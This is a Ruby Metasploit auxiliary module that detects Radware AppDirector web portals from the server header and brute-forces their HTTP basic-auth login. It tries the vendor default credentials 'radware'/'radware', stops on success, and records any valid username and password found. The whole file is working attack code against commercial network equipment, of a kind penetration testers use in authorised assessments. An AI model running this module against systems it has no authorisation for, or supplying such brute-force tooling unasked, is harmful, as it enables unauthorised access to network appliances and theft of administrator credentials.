##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Radware AppDirector Bruteforce Login Utility',
      'Description'    => %{
        This module scans for Radware AppDirector's web login portal, and performs login brute force
        to identify valid credentials.
      },
      'Author'         =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
        ],
      'License'        => MSF_LICENSE,

      'DefaultOptions' =>
      {
        'DB_ALL_CREDS'    => false,
        'BLANK_PASSWORDS' => false
      }
    ))

    register_options(
      [
        OptBool.new('STOP_ON_SUCCESS', [ true, "Stop guessing when a credential works for a host", true]),
        OptString.new('USERNAME', [true, "A specific username to authenticate as, default 'radware'", "radware"]),
        OptString.new('PASSWORD', [true, "A specific password to authenticate with, deault 'radware'", "radware"])
      ], self.class)
  end

  def run_host(ip)
    unless is_app_radware?
      return
    end

    print_status("#{rhost}:#{rport} - Starting login brute force...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  #
  # What's the point of running this module if the target actually isn't Radware
  #

  def is_app_radware?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET'
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
      return false
    end

    if (res and res.headers['Server'] and res.headers['Server'].include?("Radware-web-server"))
      vprint_good("#{rhost}:#{rport} - Running Radware portal...")
      return true
    else
      vprint_error("#{rhost}:#{rport} - Application is not Radware. Module will not continue.")
      return false
    end
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET',
        'authorization' => basic_auth(user,pass)
      })

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
      return :abort

    end

    if (res and res.code == 302 and res.headers['Location'].include?('redirectId'))
      print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")

      report_hash = {
        :host   => rhost,
        :port   => rport,
        :sname  => 'Radware AppDirector',
        :user   => user,
        :pass   => pass,
        :active => true,
        :type => 'password'
      }

      report_auth_info(report_hash)
      return :next_user

    else
      vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
    end

  end
end
